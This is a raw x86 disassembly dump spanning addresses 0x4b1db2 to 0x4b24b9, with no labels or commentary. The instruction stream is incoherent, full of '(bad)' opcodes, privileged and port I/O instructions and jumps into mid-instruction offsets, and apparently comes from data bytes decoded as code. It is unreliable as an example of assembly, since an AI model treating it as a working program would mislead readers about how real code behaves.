  4b1db2:	cmp    al,BYTE PTR [esp+ecx*2-0x5d]
  4b1db6:	je     0x4b1de3
  4b1db8:	sbb    al,BYTE PTR [edx+0x24]
  4b1dbb:	ret    
  4b1dbc:	xor    DWORD PTR [eax],edx
  4b1dbe:	loopne 0x4b1e2a
  4b1dc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b1dc1:	xchg   esi,eax
  4b1dc2:	popa   
  4b1dc3:	push   edi
  4b1dc4:	lods   al,BYTE PTR ds:[esi]
  4b1dc5:	lods   al,BYTE PTR ds:[esi]
  4b1dc6:	lds    eax,FWORD PTR [edx+0x11]
  4b1dc9:	fwait
  4b1dca:	(bad)  
  4b1dcb:	or     dl,al
  4b1dcd:	rol    BYTE PTR [eax],1
  4b1dcf:	mov    eax,ds:0x5a345b08
  4b1dd4:	add    al,al
  4b1dd6:	dec    esi
  4b1dd7:	idiv   DWORD PTR [ecx]
  4b1dd9:	mov    edx,0x63b0184f
  4b1dde:	xor    DWORD PTR [edi+0x551375dc],0x1a
  4b1de5:	or     al,0x1
  4b1de7:	rcr    BYTE PTR [eax+0x533680f8],0xa7
  4b1dee:	imul   ebx,DWORD PTR [eax+ecx*1],0xb7eb9945
  4b1df5:	and    al,0xae
  4b1df7:	ins    BYTE PTR es:[edi],dx
  4b1df8:	add    eax,0x7f2d39cd
  4b1dfd:	adc    DWORD PTR [edi],ecx
  4b1dff:	sub    eax,0xcd4988e3
  4b1e04:	int3   
  4b1e05:	push   es
  4b1e06:	fiadd  WORD PTR [esi+ebx*8]
  4b1e09:	lea    ecx,[esi-0x3f2267eb]
  4b1e0f:	cmp    al,BYTE PTR [edi*8-0x306f4e73]
  4b1e16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b1e17:	lods   al,BYTE PTR ds:[esi]
  4b1e18:	adc    BYTE PTR [edi],dh
  4b1e1a:	adc    DWORD PTR [edx-0x3d],0xaf3a43a0
  4b1e21:	retf   
  4b1e22:	dec    esi
  4b1e23:	xor    BYTE PTR [esi],cl
  4b1e25:	xchg   DWORD PTR [esi+eiz*1],esp
  4b1e28:	aam    0x93
  4b1e2a:	cmp    dh,ah
  4b1e2c:	and    ch,cl
  4b1e2e:	or     eax,DWORD PTR [ebx]
  4b1e30:	jo     0x4b1e7b
  4b1e32:	jne    0x4b1e29
  4b1e34:	es jne 0x4b1e58
  4b1e37:	cs js  0x4b1ddf
  4b1e3a:	or     al,0x5
  4b1e3c:	aad    0x18
  4b1e3e:	pop    esi
  4b1e3f:	or     BYTE PTR [esi+0x2b],dh
  4b1e42:	ret    
  4b1e43:	pusha  
  4b1e44:	test   eax,0xb904861f
  4b1e49:	add    bh,BYTE PTR [ebx]
  4b1e4b:	jl     0x4b1ea8
  4b1e4d:	pop    eax
  4b1e4e:	sub    DWORD PTR [edx+0x14],ecx
  4b1e51:	or     eax,DWORD PTR [edi+0x4921fa01]
  4b1e57:	cmc    
  4b1e58:	add    ebx,DWORD PTR [ecx+0x4]
  4b1e5b:	jno    0x4b1e7e
  4b1e5d:	add    BYTE PTR [ebx],ah
  4b1e5f:	cmp    ch,BYTE PTR [esi]
  4b1e61:	aad    0x36
  4b1e63:	or     BYTE PTR [ebp+0x61],ch
  4b1e66:	jl     0x4b1ea9
  4b1e68:	jl     0x4b1dee
  4b1e6a:	and    ebx,eax
  4b1e6c:	sbb    DWORD PTR [esi],edx
  4b1e6e:	jo     0x4b1e75
  4b1e70:	pop    edx
  4b1e71:	leave  
  4b1e72:	test   esp,edi
  4b1e74:	xor    eax,0xdd015d03
  4b1e79:	inc    ebx
  4b1e7a:	mov    edx,0xbe08564b
  4b1e7f:	add    al,0x2b
  4b1e81:	cmp    DWORD PTR [edi+0x8],esi
  4b1e84:	jbe    0x4b1e87
  4b1e86:	cmp    ebp,DWORD PTR [eax-0x78]
  4b1e89:	push   esi
  4b1e8a:	std    
  4b1e8b:	or     BYTE PTR [ecx],bh
  4b1e8d:	jno    0x4b1e10
  4b1e8f:	scas   al,BYTE PTR es:[edi]
  4b1e90:	and    edx,ebp
  4b1e92:	adc    al,0xc0
  4b1e94:	cli    
  4b1e95:	or     al,0x70
  4b1e97:	daa    
  4b1e98:	mov    es,WORD PTR [edx-0x17]
  4b1e9b:	dec    BYTE PTR [edx+0x45b765]
  4b1ea1:	lods   eax,DWORD PTR ds:[esi]
  4b1ea2:	mov    ch,0x34
  4b1ea4:	xor    eax,0x7670ac48
  4b1ea9:	js     0x4b1ed2
  4b1eab:	outs   dx,DWORD PTR ds:[esi]
  4b1eac:	lds    esi,FWORD PTR [eax]
  4b1eae:	mov    dh,0xfb
  4b1eb0:	push   cs
  4b1eb1:	iret   
  4b1eb2:	retf   
  4b1eb3:	jbe    0x4b1e97
  4b1eb5:	jo     0x4b1f0a
  4b1eb7:	inc    ecx
  4b1eb8:	(bad)  
  4b1eb9:	cmp    al,0x70
  4b1ebb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b1ebc:	inc    ebx
  4b1ebd:	jbe    0x4b1ec0
  4b1ebf:	and    al,al
  4b1ec1:	imul   ebp,ecx,0x69
  4b1ec4:	mov    ss,WORD PTR [ecx+0x65eb09d8]
  4b1eca:	arpl   bp,bx
  4b1ecc:	sbb    esp,DWORD PTR [eax]
  4b1ece:	ins    DWORD PTR es:[edi],dx
  4b1ecf:	rcl    cl,1
  4b1ed1:	xor    bp,cx
  4b1ed4:	ss add al,0x86
  4b1ed7:	inc    eax
  4b1ed8:	inc    ecx
  4b1ed9:	aas    
  4b1eda:	clc    
  4b1edb:	adc    ebx,DWORD PTR [esi]
  4b1edd:	add    al,BYTE PTR [ebx+0x13]
  4b1ee0:	jp     0x4b1e98
  4b1ee2:	adc    al,0x6
  4b1ee4:	iret   
  4b1ee5:	sub    ebx,esp
  4b1ee7:	mov    al,0x6
  4b1ee9:	loop   0x4b1f01
  4b1eeb:	hlt    
  4b1eec:	or     esi,DWORD PTR [ebx]
  4b1eee:	jo     0x4b1f4d
  4b1ef0:	jnp    0x4b1f49
  4b1ef2:	enter  0x8975,0x2c
  4b1ef6:	call   0x90f97387
  4b1efb:	dec    edx
  4b1efc:	popa   
  4b1efd:	or     al,0xe
  4b1eff:	aad    0x60
  4b1f01:	add    al,0x56
  4b1f03:	call   0x10c19fbe
  4b1f08:	mov    ds:0x5f8f1334,eax
  4b1f0d:	sub    DWORD PTR [esi+esi*2],eax
  4b1f10:	sbb    BYTE PTR [ecx],dh
  4b1f12:	sbb    DWORD PTR [eax+0x71f8dea1],esi
  4b1f18:	push   esp
  4b1f19:	push   0x72
  4b1f1b:	inc    ebp
  4b1f1c:	bound  esi,QWORD PTR [eax+0x32]
  4b1f1f:	mov    eax,ds:0x2efd038a
  4b1f24:	mov    eax,0xa7008188
  4b1f29:	push   ecx
  4b1f2a:	dec    ecx
  4b1f2b:	add    dl,bl
  4b1f2d:	xchg   esp,eax
  4b1f2e:	xor    ebx,DWORD PTR [edi-0x3e]
  4b1f31:	into   
  4b1f32:	imul   ebp,DWORD PTR [esp+ebp*8+0x1a],0xf033adfe
  4b1f3a:	push   ds
  4b1f3b:	dec    edx
  4b1f3c:	xchg   ecx,eax
  4b1f3d:	mov    ch,0x76
  4b1f3f:	sbb    BYTE PTR [ebp-0xc],bh
  4b1f42:	test   eax,0x20180815
  4b1f47:	sbb    ebx,ebp
  4b1f49:	mov    db0,ebx
  4b1f4c:	pusha  
  4b1f4d:	clc    
  4b1f4e:	and    cl,BYTE PTR [ebx+0x54]
  4b1f51:	sbb    BYTE PTR [edx-0x297ab53e],0xa4
  4b1f58:	push   esp
  4b1f59:	sbb    bl,ch
  4b1f5b:	add    al,0xe8
  4b1f5d:	and    BYTE PTR [esp+ebx*1-0x5d],bl
  4b1f61:	sbb    eax,eax
  4b1f63:	fistp  WORD PTR cs:[ecx+0x10e0a070]
  4b1f6a:	xchg   ebp,eax
  4b1f6b:	and    eax,0x787a0cec
  4b1f70:	inc    eax
  4b1f71:	fcom   DWORD PTR [ebx-0xa]
  4b1f74:	push   ecx
  4b1f75:	push   esi
  4b1f76:	xchg   DWORD PTR [edx+0x50],esp
  4b1f79:	scas   al,BYTE PTR es:[edi]
  4b1f7a:	mov    BYTE PTR [edi+0x3],dl
  4b1f7d:	lds    esp,FWORD PTR [ecx*8-0xbf72e6c]
  4b1f84:	hlt    
  4b1f85:	pop    edi
  4b1f86:	pop    ds
  4b1f87:	call   0x491d:0x7d52226e
  4b1f8e:	or     al,0x97
  4b1f90:	inc    eax
  4b1f91:	addr16 pusha 
  4b1f93:	inc    edi
  4b1f94:	or     dl,BYTE PTR [edi+0x44]
  4b1f97:	out    0xa,al
  4b1f99:	mov    edi,gs
  4b1f9b:	add    eax,0x108d3272
  4b1fa0:	cdq    
  4b1fa1:	pop    ds
  4b1fa2:	mov    gs,WORD PTR [ebp-0x7bb6f7ec]
  4b1fa8:	clc    
  4b1fa9:	mov    ch,0xe1
  4b1fab:	mov    cl,0xf5
  4b1fad:	pop    ds
  4b1fae:	mov    bh,0xfc
  4b1fb0:	xlat   BYTE PTR ds:[ebx]
  4b1fb1:	icebp  
  4b1fb2:	ins    DWORD PTR es:[edi],dx
  4b1fb3:	rol    cl,0x1c
  4b1fb6:	fld    QWORD PTR [ebx+edx*2-0x73]
  4b1fba:	sbb    bh,BYTE PTR [esi+0x471ab1c5]
  4b1fc0:	fsubr  st(1),st
  4b1fc2:	pop    edx
  4b1fc3:	cli    
  4b1fc4:	sub    BYTE PTR ds:0x7657027d,ch
  4b1fca:	push   ebp
  4b1fcb:	mov    eax,ds:0x8d795562
  4b1fd0:	sbb    BYTE PTR [eax-0x6d539527],cl
  4b1fd6:	es mov ch,0x65
  4b1fd9:	sbb    eax,0x8dc80580
  4b1fde:	sub    cl,BYTE PTR [eax]
  4b1fe0:	add    BYTE PTR [ecx+esi*2-0x357d945a],cl
  4b1fe7:	sbb    DWORD PTR [eax],0x63
  4b1fea:	nop
  4b1feb:	or     DWORD PTR [ecx],0x4b515829
  4b1ff1:	std    
  4b1ff2:	mov    cl,0x87
  4b1ff4:	mov    ah,0x61
  4b1ff6:	nop
  4b1ff7:	add    DWORD PTR [edi+ebx*4],eax
  4b1ffa:	retf   
  4b1ffb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b1ffc:	inc    esp
  4b1ffd:	inc    ecx
  4b1ffe:	pop    ebx
  4b1fff:	push   ss
  4b2000:	jae    0x4b2037
  4b2002:	dec    ebp
  4b2003:	hlt    
  4b2004:	popa   
  4b2005:	lods   al,BYTE PTR ds:[esi]
  4b2006:	mov    ah,0x92
  4b2008:	retf   
  4b2009:	add    al,0x57
  4b200b:	sahf   
  4b200c:	sti    
  4b200d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b200e:	or     edx,edx
  4b2010:	imul   ebp,esp,0x3e321043
  4b2016:	inc    ebp
  4b2017:	popf   
  4b2018:	aaa    
  4b2019:	nop
  4b201a:	or     eax,0x1e480224
  4b201f:	cwde   
  4b2020:	rcl    BYTE PTR [ebp+0x57535039],cl
  4b2026:	rcl    DWORD PTR [eax+0x2a],1
  4b2029:	jns    0x4b202f
  4b202b:	mov    edi,edx
  4b202d:	nop
  4b202e:	test   BYTE PTR [esi-0x17],dl
  4b2031:	aas    
  4b2032:	jg     0x4b2068
  4b2034:	dec    ebp
  4b2035:	and    dl,ah
  4b2037:	or     bl,bh
  4b2039:	inc    eax
  4b203a:	add    al,0xf4
  4b203c:	clc    
  4b203d:	int3   
  4b203e:	pop    ss
  4b203f:	test   bh,dl
  4b2041:	cld    
  4b2042:	xchg   edi,eax
  4b2043:	push   eax
  4b2044:	shl    DWORD PTR [ebp+0x5],0x97
  4b2048:	movaps xmm0,XMMWORD PTR [edi]
  4b204b:	jbe    0x4b205b
  4b204d:	sbb    al,0x51
  4b204f:	push   es
  4b2050:	pop    eax
  4b2051:	lock fmul QWORD PTR [esi+0x67]
  4b2055:	dec    edx
  4b2056:	sbb    BYTE PTR [edi],ah
  4b2058:	clc    
  4b2059:	add    eax,0x8da4c1a1
  4b205e:	and    BYTE PTR [ebx],0x76
  4b2061:	add    al,0xc9
  4b2063:	push   ss
  4b2064:	sbb    DWORD PTR [ebx-0x36880ff4],0x3ae004f0
  4b206e:	addr16 clc 
  4b2070:	or     eax,0x36207a0
  4b2075:	aaa    
  4b2076:	adc    al,0x50
  4b2078:	xchg   edx,eax
  4b2079:	push   ebx
  4b207a:	rol    DWORD PTR [edi],0x21
  4b207d:	loope  0x4b20ed
  4b207f:	mov    ah,BYTE PTR [edx-0x52dbb22b]
  4b2085:	jns    0x4b20c0
  4b2087:	adc    BYTE PTR [ecx-0x7488e153],dl
  4b208d:	cld    
  4b208e:	lods   al,BYTE PTR es:[esi]
  4b2090:	push   edi
  4b2091:	and    bh,dh
  4b2093:	pop    eax
  4b2094:	sahf   
  4b2095:	xor    BYTE PTR ds:0x21924cd9,bh
  4b209b:	dec    esi
  4b209c:	jp     0x4b203f
  4b209e:	loopne 0x4b208b
  4b20a0:	int3   
  4b20a1:	push   ss
  4b20a2:	test   DWORD PTR [eax],0x421b0b74
  4b20a8:	mov    eax,0x545423b8
  4b20ad:	mov    cl,0x2e
  4b20af:	leave  
  4b20b0:	inc    edi
  4b20b1:	aad    0x52
  4b20b3:	add    DWORD PTR [ecx+eax*4],eax
  4b20b6:	mov    ch,0xa5
  4b20b8:	adc    DWORD PTR [ecx+0x35],esp
  4b20bb:	sbb    dh,BYTE PTR [ebp-0x5]
  4b20be:	dec    edx
  4b20bf:	xor    BYTE PTR [eax+0x40d48058],dl
  4b20c5:	xor    ebx,DWORD PTR [edx]
  4b20c7:	cmc    
  4b20c8:	sbb    eax,0x42b050d9
  4b20cd:	mov    WORD PTR [edx-0x7958c8a9],ds
  4b20d3:	and    edi,DWORD PTR [eax*4+0x877f71e]
  4b20da:	cmp    ch,al
  4b20dc:	push   edx
  4b20dd:	push   ebp
  4b20de:	pop    ds
  4b20df:	jnp    0x4b2160
  4b20e1:	sahf   
  4b20e2:	jae    0x4b2137
  4b20e4:	mov    eax,0x3b24896a
  4b20e9:	push   esi
  4b20ea:	inc    edi
  4b20eb:	mov    eax,ds:0x9d8a0283
  4b20f0:	and    dh,dh
  4b20f2:	mov    ebx,0xe65a04e1
  4b20f7:	lods   eax,DWORD PTR ds:[esi]
  4b20f8:	or     al,0x16
  4b20fa:	xor    cl,ah
  4b20fc:	mov    eax,ds:0xf78b18f1
  4b2101:	push   es
  4b2102:	add    ch,BYTE PTR [edx-0x40]
  4b2105:	mov    edx,0xb10b392
  4b210a:	mov    ebx,DWORD PTR [eax+0x60]
  4b210d:	add    al,0x9a
  4b210f:	jbe    0x4b2120
  4b2111:	inc    eax
  4b2112:	adc    al,0xd9
  4b2114:	lods   eax,DWORD PTR ds:[esi]
  4b2115:	pop    ebx
  4b2116:	pop    edx
  4b2117:	es sub BYTE PTR ss:[eax],dl
  4b211b:	adc    cl,BYTE PTR [eax+0x71]
  4b211e:	fs jb  0x4b216f
  4b2121:	jge    0x4b2145
  4b2123:	inc    edi
  4b2124:	icebp  
  4b2125:	(bad)  
  4b2127:	push   esi
  4b2128:	aaa    
  4b2129:	and    al,0x9
  4b212b:	lahf   
  4b212c:	cmp    ch,ch
  4b212e:	call   0x981d:0xc360380
  4b2135:	mov    ah,0x70
  4b2137:	mov    ebp,DWORD PTR [eax+0x1bc2ab02]
  4b213d:	mov    eax,0x4d301284
  4b2142:	and    eax,DWORD PTR ds:0xfea4b41d
  4b2148:	daa    
  4b2149:	cmp    al,0x0
  4b214b:	add    ecx,0x42
  4b214e:	jb     0x4b21ab
  4b2150:	mov    DWORD PTR [ebx+eax*4+0x5e3840c],0xc1260705
  4b215b:	add    eax,0x6d0478b0
  4b2160:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4b2162:	dec    edx
  4b2163:	ret    
  4b2164:	loopne 0x4b20ef
  4b2166:	pop    ds
  4b2167:	int    0x11
  4b2169:	add    al,0x2e
  4b216b:	cs push es
  4b216d:	and    DWORD PTR [ecx+0x1a24005d],edi
  4b2173:	mov    ds,eax
  4b2175:	pop    DWORD PTR [esi+ebp*4+0xe]
  4b2179:	and    DWORD PTR [ecx+0x24adb33],ebx
  4b217f:	cmp    DWORD PTR [edx-0x26],0x93fd4925
  4b2186:	xor    esi,DWORD PTR [ecx]
  4b2188:	push   ecx
  4b2189:	vmovups xmm7,xmm2
  4b218d:	push   edi
  4b218e:	or     cl,bl
  4b2190:	imul   eax,edi,0x5fa57400
  4b2196:	js     0x4b21e8
  4b2198:	sbb    al,0x20
  4b219a:	dec    edi
  4b219b:	dec    ebp
  4b219c:	loopne 0x4b21ac
  4b219e:	jne    0x4b2208
  4b21a0:	adc    al,0x31
  4b21a2:	mov    dh,al
  4b21a4:	dec    ecx
  4b21a5:	cmp    dh,bh
  4b21a7:	fwait
  4b21a8:	sub    eax,esp
  4b21aa:	xchg   ecx,eax
  4b21ab:	in     eax,0x9b
  4b21ad:	enter  0x3151,0x78
  4b21b1:	cdq    
  4b21b2:	xor    BYTE PTR [ecx+0xe],dl
  4b21b5:	dec    esi
  4b21b6:	inc    esp
  4b21b7:	or     ecx,DWORD PTR [ebx]
  4b21b9:	fs dec edi
  4b21bb:	and    eax,ecx
  4b21bd:	add    dl,BYTE PTR [edx]
  4b21bf:	jmp    0x7c18:0x650cae08
  4b21c6:	loop   0x4b21d8
  4b21c8:	outs   dx,DWORD PTR ds:[esi]
  4b21c9:	imul   ecx,DWORD PTR [edx+0x6177602],0x75224429
  4b21d3:	jno    0x4b21e1
  4b21d5:	add    BYTE PTR [ebx+0x31],0x4c
  4b21d9:	mov    esi,DWORD PTR [edi+edx*4+0x75]
  4b21dd:	loopne 0x4b2177
  4b21df:	jo     0x4b21f9
  4b21e1:	adc    DWORD PTR [ecx+0x1],esi
  4b21e4:	dec    esp
  4b21e5:	sub    cl,BYTE PTR [esi]
  4b21e7:	mov    al,0x29
  4b21e9:	dec    ebp
  4b21ea:	mov    eax,0x5ad87d01
  4b21ef:	inc    eax
  4b21f0:	push   edi
  4b21f1:	add    dh,al
  4b21f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b21f4:	mov    ebp,eax
  4b21f6:	push   0xfffffffb
  4b21f8:	mov    BYTE PTR [edi+0x31462477],dh
  4b21fe:	hlt    
  4b21ff:	cmp    esp,0xffffffb7
  4b2202:	sub    al,BYTE PTR [ebx+ebp*4]
  4b2205:	bound  eax,QWORD PTR [esi]
  4b2207:	stos   BYTE PTR es:[edi],al
  4b2208:	jnp    0x4b2202
  4b220a:	jns    0x4b224d
  4b220c:	test   DWORD PTR [ebx],ecx
  4b220e:	mov    cl,0x1d
  4b2210:	ja     0x4b220c
  4b2212:	or     eax,esp
  4b2214:	rol    dh,0x2
  4b2217:	mov    eax,DWORD PTR [ebx-0x50]
  4b221a:	cmp    cl,BYTE PTR [eax]
  4b221c:	xchg   esp,eax
  4b221d:	repnz not BYTE PTR [edi]
  4b2220:	cld    
  4b2221:	add    eax,0xe2a216f
  4b2226:	xor    DWORD PTR ds:0x58b88a63,esp
  4b222c:	mov    al,ds:0xcfc0658f
  4b2231:	sub    eax,0x1e8cc53c
  4b2236:	add    al,0xf0
  4b2238:	pop    edi
  4b2239:	repnz mov ds:0x1992099,al
  4b223f:	or     al,0xd3
  4b2241:	add    al,0x63
  4b2243:	add    DWORD PTR [eax],ebx
  4b2245:	popa   
  4b2246:	pusha  
  4b2247:	shl    dl,1
  4b2249:	arpl   WORD PTR [edi+0x850bd],dx
  4b224f:	push   es
  4b2250:	int    0x80
  4b2252:	push   ecx
  4b2253:	(bad)  
  4b2254:	cmp    esp,edx
  4b2256:	or     eax,0x53d70210
  4b225b:	aas    
  4b225c:	add    BYTE PTR [ebp-0x39],0x7b
  4b2260:	out    0xd5,eax
  4b2262:	xchg   ebx,eax
  4b2263:	outs   dx,DWORD PTR ds:[esi]
  4b2264:	inc    ecx
  4b2265:	and    eax,0xcec05912
  4b226a:	inc    edi
  4b226b:	sbb    al,0x86
  4b226d:	jne    0x4b2274
  4b226f:	jge    0x4b2261
  4b2271:	adc    esi,DWORD PTR [ecx+eax*2+0x569a6f73]
  4b2278:	mov    eax,ds:0xc45ea6a9
  4b227d:	xor    bl,BYTE PTR [ebx-0x80]
  4b2280:	mov    WORD PTR [ebx+0x602596a7],gs
  4b2286:	sbb    ch,cl
  4b2288:	mov    cl,0xa3
  4b228a:	ss xchg esi,eax
  4b228c:	out    dx,eax
  4b228d:	add    BYTE PTR [ebx-0x5b],dl
  4b2290:	fld    TBYTE PTR ds:0x69c8c1b9
  4b2296:	iret   
  4b2297:	add    al,0x9d
  4b2299:	lods   al,BYTE PTR ds:[esi]
  4b229a:	or     eax,0xbf0c26af
  4b229f:	int    0x91
  4b22a1:	add    DWORD PTR [ebx+0x61860055],eax
  4b22a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b22a8:	sub    al,0xff
  4b22aa:	outs   dx,BYTE PTR ds:[esi]
  4b22ab:	imul   eax,DWORD PTR [ebp-0x71],0x2447d1dc
  4b22b2:	mov    edi,0x7642d075
  4b22b7:	(bad)  
  4b22b8:	mov    edx,DWORD PTR [ebp+ecx*4+0x5a471a55]
  4b22bf:	sub    DWORD PTR [ecx],ecx
  4b22c1:	in     eax,dx
  4b22c2:	outs   dx,DWORD PTR ds:[esi]
  4b22c3:	int3   
  4b22c4:	push   es
  4b22c5:	and    esi,edx
  4b22c7:	pop    es
  4b22c8:	or     ebx,DWORD PTR [eax+edi*2]
  4b22cb:	cs inc edi
  4b22cd:	add    eax,0x24f581b5
  4b22d2:	cmp    esi,DWORD PTR [ebx-0x7441dd80]
  4b22d8:	jp     0x4b22da
  4b22da:	mov    al,0x7
  4b22dc:	popf   
  4b22dd:	xor    al,0xb1
  4b22df:	adc    cl,BYTE PTR [esi]
  4b22e1:	ret    
  4b22e2:	inc    esi
  4b22e3:	pop    es
  4b22e4:	adc    dl,cl
  4b22e6:	inc    DWORD PTR [esi+0x741e0281]
  4b22ec:	cmp    DWORD PTR [edx],eax
  4b22ee:	inc    ebp
  4b22ef:	adc    BYTE PTR [edi],cl
  4b22f1:	rcl    ch,cl
  4b22f3:	es jne 0x4b2306
  4b22f6:	(bad)  
  4b22f8:	pop    edx
  4b22f9:	add    DWORD PTR [ebx+0x201fda20],edx
  4b22ff:	lods   al,BYTE PTR ds:[esi]
  4b2300:	xor    eax,0x88027d90
  4b2305:	push   es
  4b2306:	outs   dx,BYTE PTR ds:[esi]
  4b2307:	sbb    al,0x7e
  4b2309:	mov    esi,0x633a0c93
  4b230e:	sbb    DWORD PTR [ebp+0x5b],0x679b269f
  4b2315:	enter  0xa67,0xd7
  4b2319:	and    cl,ah
  4b231b:	lds    ecx,FWORD PTR [ebx+0x78]
  4b231e:	adc    BYTE PTR [eax+0x68],0xf0
  4b2322:	jno    0x4b231c
  4b2324:	xchg   esi,eax
  4b2325:	(bad)  
  4b2326:	int    0x55
  4b2328:	hlt    
  4b2329:	push   edx
  4b232a:	jle    0x4b2389
  4b232c:	hlt    
  4b232d:	shl    ch,0x25
  4b2330:	in     al,0x6
  4b2332:	push   ebp
  4b2333:	fcmovnbe st,st(2)
  4b2335:	add    eax,0x6eb1b94a
  4b233a:	pusha  
  4b233b:	(bad)  
  4b233c:	pop    ebx
  4b233d:	xor    ebp,DWORD PTR es:[ebp+0x36a4ffd]
  4b2344:	inc    edi
  4b2345:	jmp    0x2d74:0x4f4e9ec5
  4b234c:	mov    dh,0x80
  4b234e:	adc    eax,0x2775d589
  4b2353:	adc    bl,BYTE PTR cs:[eax+0x15aac282]
  4b235a:	or     DWORD PTR [ebp+0x71],edx
  4b235d:	inc    ecx
  4b235e:	lods   al,BYTE PTR ds:[esi]
  4b235f:	pop    edx
  4b2360:	cmp    eax,0x65a67421
  4b2365:	adc    BYTE PTR [ebx],cl
  4b2367:	out    0x64,eax
  4b2369:	sbb    esp,DWORD PTR [edi+0x62]
  4b236c:	dec    ebx
  4b236d:	inc    ecx
  4b236e:	xlat   BYTE PTR ds:[ebx]
  4b236f:	cs ss xchg edi,eax
  4b2372:	jno    0x4b238b
  4b2374:	push   ebp
  4b2375:	pop    esp
  4b2376:	cmp    BYTE PTR [esi+0x7b2dd169],dh
  4b237c:	es addr16 sbb al,0xbb
  4b2380:	inc    eax
  4b2381:	sbb    al,0x60
  4b2383:	mov    ch,0xdf
  4b2385:	add    edi,eax
  4b2387:	sub    al,0x12
  4b2389:	cmp    ebp,DWORD PTR ds:0x70137232
  4b238f:	out    dx,eax
  4b2390:	and    BYTE PTR [ebp+0x28047acf],al
  4b2396:	add    DWORD PTR ds:0x6215d71,esp
  4b239c:	aam    0x9
  4b239e:	push   esi
  4b239f:	dec    ecx
  4b23a0:	add    DWORD PTR [eax-0x70d715dd],0xffffffef
  4b23a7:	mov    cl,0x86
  4b23a9:	aad    0xa9
  4b23ab:	add    DWORD PTR [edi-0x14aab5bd],edx
  4b23b1:	cmp    al,0x28
  4b23b3:	and    edx,ebp
  4b23b5:	jno    0x4b2378
  4b23b7:	or     al,cl
  4b23b9:	fisttp WORD PTR [edi+0x57]
  4b23bc:	or     dl,BYTE PTR [esi]
  4b23be:	(bad)  
  4b23bf:	mov    dl,0xe0
  4b23c1:	lods   eax,DWORD PTR ds:[esi]
  4b23c2:	mov    WORD PTR ds:0x5b5694dc,ss
  4b23c8:	sub    al,0x95
  4b23ca:	(bad)  
  4b23cb:	not    ch
  4b23cd:	xor    eax,DWORD PTR [ecx]
  4b23cf:	jecxz  0x4b23f8
  4b23d1:	retf   0xd7e0
  4b23d4:	retf   0x184d
  4b23d7:	sub    DWORD PTR [ecx],eax
  4b23d9:	aaa    
  4b23da:	adc    al,0x6
  4b23dc:	or     DWORD PTR [ebx-0x4f],edx
  4b23df:	add    al,0xd2
  4b23e1:	dec    eax
  4b23e2:	loopne 0x4b23bc
  4b23e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b23e5:	or     al,0xaf
  4b23e7:	lea    edx,[esi+0x5f]
  4b23ea:	inc    edx
  4b23eb:	fwait
  4b23ec:	push   esi
  4b23ed:	test   BYTE PTR [edx+eiz*2],0x41
  4b23f1:	pop    ss
  4b23f2:	sub    BYTE PTR [eax],0xcb
  4b23f5:	xchg   edx,eax
  4b23f6:	push   ss
  4b23f7:	xchg   esp,eax
  4b23f8:	dec    esi
  4b23f9:	dec    edi
  4b23fa:	mov    edi,ebx
  4b23fc:	loopne 0x4b2453
  4b23fe:	inc    ebp
  4b23ff:	mov    WORD PTR [ebp-0x75],?
  4b2402:	(bad)  
  4b2403:	adc    eax,0x4251cc2
  4b2408:	mov    esp,0x51c4c695
  4b240d:	push   ecx
  4b240e:	xchg   esp,eax
  4b240f:	xchg   esi,eax
  4b2410:	adc    BYTE PTR [esi],bl
  4b2412:	jne    0x4b2442
  4b2414:	push   0x10
  4b2416:	(bad)  
  4b2417:	cmp    dl,BYTE PTR [ebp-0x7be28a0d]
  4b241d:	test   DWORD PTR [ecx+0x1],0x1411b901
  4b2424:	test   DWORD PTR [edx],ecx
  4b2426:	ret    0x6de8
  4b2429:	push   ebx
  4b242a:	cmp    DWORD PTR [eax],esi
  4b242c:	jno    0x4b23e6
  4b242e:	xor    BYTE PTR [ebx+0x2f0e4eb4],bl
  4b2434:	sbb    eax,0x1fb3ef7a
  4b2439:	sub    bl,dl
  4b243b:	inc    esi
  4b243c:	test   al,0xf1
  4b243e:	jnp    0x4b243f
  4b2440:	adc    al,0x3c
  4b2442:	push   esp
  4b2443:	sbb    al,0x6d
  4b2445:	dec    edi
  4b2446:	add    al,0xad
  4b2448:	and    ecx,DWORD PTR [eax+edx*1]
  4b244b:	test   BYTE PTR [esi],al
  4b244d:	pop    ebx
  4b244e:	lock adc al,0x7
  4b2451:	inc    ebx
  4b2453:	push   cs
  4b2454:	push   0xffffffaa
  4b2456:	mov    bl,0x24
  4b2458:	fucomp st(3)
  4b245a:	fs add cl,bh
  4b245d:	pop    esp
  4b245e:	or     al,0xc6
  4b2460:	add    BYTE PTR [ecx*2-0x6079d9db],cl
  4b2467:	outs   dx,DWORD PTR ds:[esi]
  4b2468:	jl     0x4b240c
  4b246a:	je     0x4b24dc
  4b246c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b246d:	xor    BYTE PTR [eax],0x75
  4b2470:	push   eax
  4b2471:	(bad)  
  4b2472:	fstp   TBYTE PTR [eax]
  4b2474:	xor    DWORD PTR [ebp-0x76d08373],esp
  4b247a:	test   dl,dl
  4b247c:	cmp    ebx,DWORD PTR [eax+ebx*1]
  4b247f:	sub    BYTE PTR [ebx+0x6],cl
  4b2482:	arpl   WORD PTR [ebx],ax
  4b2484:	pop    ds
  4b2485:	ins    DWORD PTR es:[edi],dx
  4b2486:	ss addr16 test eax,0xb8130706
  4b248d:	and    eax,0xd681a913
  4b2492:	push   edx
  4b2493:	mov    al,0x9a
  4b2495:	repz and al,0xc3
  4b2498:	jo     0x4b24ca
  4b249a:	out    dx,eax
  4b249b:	retf   
  4b249c:	ins    DWORD PTR es:[edi],dx
  4b249d:	adc    BYTE PTR [eax-0x62],dl
  4b24a0:	and    DWORD PTR [eax],ecx
  4b24a2:	mov    bh,BYTE PTR [eax-0x7cea4af4]
  4b24a8:	retf   
  4b24a9:	mov    al,0x63
  4b24ab:	(bad)  
  4b24ac:	mov    ecx,0x87698264
  4b24b1:	add    al,BYTE PTR [ecx+eiz*1]
  4b24b4:	or     eax,0x14e0997
  4b24b9:	add    DWORD PTR [eax],ecx
